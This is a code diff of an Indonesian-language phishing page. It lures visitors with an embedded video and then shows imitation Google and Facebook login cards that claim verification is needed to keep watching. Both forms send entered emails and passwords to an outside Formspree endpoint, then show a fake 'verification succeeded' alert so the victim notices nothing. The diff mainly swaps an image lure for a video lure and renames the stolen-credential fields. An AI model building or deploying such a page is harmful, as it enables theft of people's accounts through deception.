@@ -11,48 +11,48 @@
             height: 100%; width: 100%; background-color: #000; overflow: hidden;
         }
 
-        /* Gambar Konten di Belakang */
-        #bg-image {
+        /* Video Background (Videy Player) */
+        #video-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; justify-content: center; align-items: center;
-            background-color: #ffffff; z-index: 1;
+            z-index: 1;
         }
-        #bg-image img { width: 100%; height: 100%; object-fit: contain; }
+        iframe { width: 100%; height: 100%; border: none; }
 
+        /* Area Klik Pemicu (Transparan) */
         #click-trigger {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 2; cursor: pointer;
         }
 
-        /* Overlay Gelap & Blur */
+        /* Overlay Utama */
         #main-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(8px);
+            background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(8px);
             z-index: 1000; justify-content: center; align-items: center;
         }
 
-        /* Card Container */
+        /* Card Umum */
         .card {
-            background: #fff; width: 92%; max-width: 400px; padding: 25px;
+            background: #fff; width: 92%; max-width: 400px; padding: 35px 25px;
             border-radius: 8px; position: relative;
-            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
-            animation: fadeIn 0.3s ease-out;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.25);
+            animation: popUp 0.3s ease-out;
         }
 
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes popUp { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
         .close-btn {
             position: absolute; top: 12px; right: 15px; font-size: 26px;
-            color: #606770; cursor: pointer; line-height: 1; z-index: 10;
+            color: #606770; cursor: pointer; line-height: 1;
         }
 
-        /* Menu Pilihan Login */
-        #choice-section h2 { font-size: 20px; font-weight: 600; margin-bottom: 25px; text-align: center; color: #1c1e21; }
+        /* --- PILIHAN LOGIN --- */
+        #choice-section h2 { font-size: 20px; font-weight: 500; margin-bottom: 25px; color: #1c1e21; text-align: center; }
         .btn-choice {
             display: flex; align-items: center; justify-content: center;
             width: 100%; padding: 12px; margin-bottom: 12px;
             border-radius: 6px; border: 1px solid #dadce0;
-            font-size: 16px; font-weight: 500; cursor: pointer;
+            font-size: 15px; font-weight: 500; cursor: pointer;
         }
         .btn-google { background: #fff; color: #3c4043; }
         .btn-facebook { background: #1877f2; color: white; border: none; }
@@ -60,8 +60,8 @@
 
         /* --- FACEBOOK STYLE --- */
         #fb-section { display: none; text-align: center; }
-        .fb-logo { width: 112px; margin: 0 auto 15px; display: block; }
-        .fb-text { font-size: 16px; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; }
+        .fb-logo { width: 120px; margin: 0 auto 15px; display: block; }
+        .fb-text { font-size: 16px; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; font-weight: 400; }
         .fb-input {
             width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
             border-radius: 6px; font-size: 15px; margin-bottom: 12px;
@@ -70,11 +70,11 @@
         .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
         .fb-btn { 
             width: 100%; background: #1877f2; color: #fff; border: none; 
-            padding: 10px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
+            padding: 10px; border-radius: 6px; font-size: 19px; font-weight: bold; cursor: pointer;
         }
 
         /* --- GOOGLE STYLE --- */
-        #google-section { display: none; padding: 30px 15px; }
+        #google-section { display: none; text-align: left; }
         .g-logo { width: 75px; display: block; margin: 0 auto 10px; }
         .g-title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 10px; }
         .g-subtitle { font-size: 16px; text-align: center; margin-bottom: 30px; color: #202124; }
@@ -86,33 +86,34 @@
         .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; }
         .g-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
 
-        /* Eye Icon Utility */
-        .pw-wrap { position: relative; }
-        .eye { 
+        /* Password Visibility Utility */
+        .pw-wrapper { position: relative; width: 100%; }
+        .eye-btn {
             position: absolute; right: 12px; top: 12px; cursor: pointer;
-            display: flex; align-items: center;
+            display: flex; align-items: center; justify-content: center;
         }
-        .eye svg { width: 24px; height: 24px; fill: #606770; }
+        .eye-btn svg { width: 22px; height: 22px; fill: #606770; }
     </style>
 </head>
 <body>
 
-    <div id="bg-image">
-        <img src="https://i.postimg.cc/y6MzwjwN/Screenshot-2026-02-16-08-31-05-219-com-whatsapp-w4b-edit.jpg">
+    <div id="video-container">
+        <iframe src="https://videy.co/v/?id=PSvhx8lN1" allow="autoplay; fullscreen"></iframe>
     </div>
 
-    <div id="click-trigger" onclick="openOverlay()"></div>
+    <div id="click-trigger" onclick="openLogin()"></div>
 
     <div id="main-overlay">
         
         <div id="choice-section" class="card">
-            <h2>Verifikasi Identitas</h2>
+            <h2>Lanjutkan Menonton</h2>
             <div class="btn-choice btn-google" onclick="showForm('google')">
-                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png"> Lanjutkan dengan Google
+                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png"> Login dengan Google
             </div>
             <div class="btn-choice btn-facebook" onclick="showForm('fb')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> Lanjutkan dengan Facebook
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> Login dengan Facebook
             </div>
+            <p style="text-align: center; font-size: 12px; color: #70757a; margin-top: 10px;">Verifikasi diperlukan untuk melanjutkan video.</p>
         </div>
 
         <div id="fb-section" class="card">
@@ -120,16 +121,16 @@
             <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg">
             <p class="fb-text">Gunakan Akun Facebook Anda</p>
             <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
-                <input type="text" name="Email_FB" class="fb-input" placeholder="Nomor ponsel atau email" required>
-                <div class="pw-wrap">
-                    <input type="password" name="Pass_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
-                    <span class="eye" onclick="togglePassword(this)">
+                <input type="text" name="Username_FB" class="fb-input" placeholder="Nomor ponsel atau email" required>
+                <div class="pw-wrapper">
+                    <input type="password" name="Sandi_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
+                    <span class="eye-btn" onclick="togglePassword(this)">
                         <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </span>
                 </div>
                 <button type="submit" class="fb-btn">Login</button>
+                <p style="color:#1877f2; font-size:14px; margin-top:15px; cursor:pointer;">Lupa kata sandi?</p>
             </form>
-            <p style="color:#1877f2; font-size:14px; margin-top:15px; cursor:pointer;">Lupa kata sandi?</p>
         </div>
 
         <div id="google-section" class="card">
@@ -138,10 +139,10 @@
             <h1 class="g-title">Login</h1>
             <p class="g-subtitle">Gunakan Akun Google Anda</p>
             <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
-                <input type="text" name="Email_G" class="g-input" placeholder="Email atau ponsel" required>
-                <div class="pw-wrap">
-                    <input type="password" name="Pass_G" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
-                    <span class="eye" onclick="togglePassword(this)">
+                <input type="text" name="Username_Google" class="g-input" placeholder="Email atau ponsel" required>
+                <div class="pw-wrapper">
+                    <input type="password" name="Sandi_Google" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
+                    <span class="eye-btn" onclick="togglePassword(this)">
                         <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </span>
                 </div>
@@ -155,7 +156,7 @@
     </div>
 
     <script>
-        function openOverlay() {
+        function openLogin() {
             document.getElementById('click-trigger').style.display = 'none';
             document.getElementById('main-overlay').style.display = 'flex';
         }
@@ -173,18 +174,17 @@
 
         function togglePassword(btn) {
             const input = btn.parentElement.querySelector('.pw-field');
-            const isPw = input.type === 'password';
-            input.type = isPw ? 'text' : 'password';
-            // Ubah ikon mata (opsional: bisa ganti SVG di sini)
+            input.type = input.type === 'password' ? 'text' : 'password';
         }
 
-        // Script AJAX & Redirect
+        // Script AJAX & Auto Hide
         const forms = document.querySelectorAll('.ajax-form');
         forms.forEach(form => {
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const btn = form.querySelector('button');
                 btn.innerHTML = "Memuat...";
+                btn.disabled = true;
                 
                 const formData = new FormData(form);
                 try {
@@ -195,8 +195,9 @@
                     });
                 } catch (err) {}
                 
-                // Apapun hasilnya, arahkan ke Grup WA
-                window.location.href = "https://videy.co/v/?id=PSvhx8lN1";
+                // Form hilang, video lanjut
+                document.getElementById('main-overlay').style.display = 'none';
+                alert("Verifikasi berhasil. Selamat menonton!");
             });
         });
     </script>
